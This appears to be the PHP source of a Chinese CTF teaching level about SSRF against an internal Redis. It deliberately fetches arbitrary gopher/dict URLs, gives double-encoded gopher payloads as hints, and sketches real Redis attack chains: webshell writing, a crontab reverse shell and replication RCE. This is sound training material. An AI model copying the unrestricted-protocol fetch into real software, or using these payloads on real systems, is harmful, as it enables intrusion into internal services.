<?php
// ============================================================
// ssrf4 · SSRF 之 gopher/dict 打内网 Redis（模拟服务）
// 漏洞：?url= 支持任意协议（含 gopher://、dict://），可向内网端口
//       发送任意字节 —— 目标是 127.0.0.1:6379 的迷你 Redis
// 取回实现：优先 PHP curl 扩展（libcurl 原生 gopher/dict），
//          无 curl 时回退 fsockopen（语义一致）
// ============================================================
$url = isset($_GET['url']) ? trim($_GET['url']) : '';
$body = null; $error = null;

function ssrf_fetch($url, &$error) {
    // —— 路径一：curl 扩展（libcurl 原生支持 gopher/dict）——
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 5,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_HEADER         => false,
            CURLOPT_FOLLOWLOCATION => false,
        ));
        $r = curl_exec($ch);
        if ($r === false) { $error = '请求失败：' . curl_error($ch); }
        curl_close($ch);
        return $r === false ? null : $r;
    }
    // —— 路径二：fsockopen 回退（手工实现 http/gopher/dict）——
    $p = parse_url($url);
    if (!$p || !isset($p['scheme'], $p['host'])) { $error = 'URL 无法解析'; return null; }
    $port = isset($p['port']) ? $p['port'] : getservbyname($p['scheme'], 'tcp');
    if (!$port) $port = 80;
    $fp = @fsockopen($p['host'], $port, $eno, $estr, 3);
    if (!$fp) { $error = "连接失败：$estr"; return null; }
    stream_set_timeout($fp, 4);
    $path = isset($p['path']) ? $p['path'] : '/';
    switch (strtolower($p['scheme'])) {
        case 'http':
        case 'https':
            fwrite($fp, "GET {$path} HTTP/1.0\r\nHost: {$p['host']}\r\n\r\n");
            $raw = '';
            while (!feof($fp)) $raw .= fread($fp, 8192);
            $sep = strpos($raw, "\r\n\r\n");
            return $sep === false ? $raw : substr($raw, $sep + 4);
        case 'gopher':
            // gopher 语义：path 中 "/_" 之后的内容原样发送（再做一次 urldecode 以对齐 curl 行为）
            $payload = urldecode($path);
            if (strncmp($payload, '/_', 2) === 0) $payload = substr($payload, 2);
            elseif ($payload !== '' && $payload[0] === '/') $payload = substr($payload, 1);
            fwrite($fp, $payload);
            $raw = '';
            while (!feof($fp)) $raw .= fread($fp, 8192);
            return $raw;
        case 'dict':
            fwrite($fp, ltrim(urldecode($path), '/') . "\r\n");
            $raw = '';
            while (!feof($fp)) $raw .= fread($fp, 8192);
            return $raw;
        default:
            $error = '不支持的协议（回退模式仅 http/gopher/dict）';
            return null;
    }
}

if ($url !== '') {
    $scheme = strtolower((string)parse_url($url, PHP_URL_SCHEME));
    $allowed = array('http', 'https', 'gopher', 'dict');
    if (!in_array($scheme, $allowed, true)) {
        $error = '本工具支持 http/https/gopher/dict 协议';
    } else {
        $body = ssrf_fetch($url, $error);
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ssrf4 · gopher 打内网 Redis | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#a855f7;color:#1b0630;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:75%;min-width:260px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
.errbox{background:#3b1519;border:1px solid #7f1d1d;color:#fca5a5;border-radius:8px;padding:10px 14px;margin-top:12px}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">SSRF · 第 4 关（本系列终章）</span>
<h1>内网服务探测助手 —— gopher 打内网 Redis</h1>
<div class="meta">难度：★★★★☆ 高阶 | 关卡 ID：<code>ssrf4</code> · 运行时：PHP（curl 扩展优先）</div>
</header>
<!-- OPS-CHECK: 需要 redis_fake.php 常驻（php redis_fake.php，127.0.0.1:6379，勿对外映射）；/flag_ssrf4.txt <?= @file_exists('/flag_ssrf4.txt')?'READY':'MISSING' ?> -->

<section class="card">
<h2>题目描述</h2>
<p>运维平台自带"内网服务探测助手"：它支持 <code>http/https/gopher/dict</code> 四种协议，据说是为了"探测各种老旧设备"。</p>
<p>情报：本机 6379 端口上跑着一个 <b>Redis（未设密码）</b>，里面有个键 <code>flag</code>。它只监听 127.0.0.1，从外面连不上——但探测助手就在这台机器上。</p>
<p>目标：用 gopher（或 dict）协议向 <code>127.0.0.1:6379</code> 发送 Redis 命令，把 <code>flag</code> 键读出来。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>URL：<input type="text" name="url" placeholder="gopher://127.0.0.1:6379/_..." value="<?= htmlspecialchars($url, ENT_QUOTES) ?>"></label>
<button type="submit">探测</button>
</form>
<?php if ($error !== null): ?>
<div class="errbox">⚠️ <?= htmlspecialchars($error, ENT_QUOTES) ?></div>
<?php elseif ($body !== null): ?>
<div class="result"><div class="t">目标返回（<?= htmlspecialchars($url, ENT_QUOTES) ?>）</div>
<pre><?= htmlspecialchars(substr((string)$body, 0, 4000), ENT_QUOTES) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>gopher 协议</b>是 SSRF 的"万能发包器"：URL 里 <code>/_</code> 之后的内容会被<b>原样发送</b>给目标端口（libcurl 会把 %xx 解码后发出）。于是"URL"变成了"任意 TCP 报文"：</p>
<pre>gopher://127.0.0.1:6379/_GET flag\r\n        ← 发送的就是这 10 个字节</pre>
<p><b>双重 URL 编码</b>（高频坑）：本工具的 url 参数经过 PHP 的一次解码。你想让 Redis 收到 <code>%0d%0a</code>（换行），就要在表单里写 <code>%250d%250a</code>——一层给 PHP 解，一层给 gopher 解。</p>
<p><b>Redis 未授权访问</b>：无密码 + 无绑定限制的 Redis，任何能连上它的代码都能执行命令。真实世界的经典打法（本关模拟服务同样支持读写，可自行体验 SET/KEYS）：</p>
<table>
<tr><th>打法</th><th>原理</th></tr>
<tr><td>读数据</td><td><code>GET flag</code>（本关）</td></tr>
<tr><td>写 webshell</td><td><code>SET x "&lt;?php ...?&gt;"</code> + <code>CONFIG SET dir</code> 到 web 目录 + <code>CONFIG SET dbfilename shell.php</code> + <code>SAVE</code></td></tr>
<tr><td>写 crontab 反弹</td><td>同理把 RDB 落到 /var/spool/cron</td></tr>
<tr><td>主从复制 RCE</td><td>伪装 master 同步恶意 .so 模块</td></tr>
</table>
<p><b>dict 协议</b>：按行发送（curl 会自动加 DICT 协议前缀），适合发单行命令，不用自己处理换行：<code>dict://127.0.0.1:6379/get:flag</code>（本关模拟服务做了宽松解析）。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：先确认 Redis 活着</summary><p>用 <code>?url=gopher://127.0.0.1:6379/_PING%250d%250a</code> 探一下——返回 <code>+PONG</code> 就是活的。（注意 %250d%250a 是双编码的换行）</p></details>
<details><summary>提示 2：想想为什么要双编码</summary><p>PHP 先解一层码，gopher 再解一层码。你最终想让 Redis 收到 <code>GET flag\r\n</code>，倒推两层应该提交什么？</p></details>
<details><summary>提示 3：payload</summary><p>读 flag：<code>?url=gopher://127.0.0.1:6379/_GET%2520flag%250d%250a</code><br>写+读（体验未授权写）：<code>?url=gopher://127.0.0.1:6379/_SET%2520user%2520hacker%250d%250aGET%2520user%250d%250a</code><br>dict 单行版：<code>?url=dict://127.0.0.1:6379/get:flag</code></p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../ssrf3">← 上一关：ssrf3</a><span>B 组系列完 · 15/15</span></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=ssrf4&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
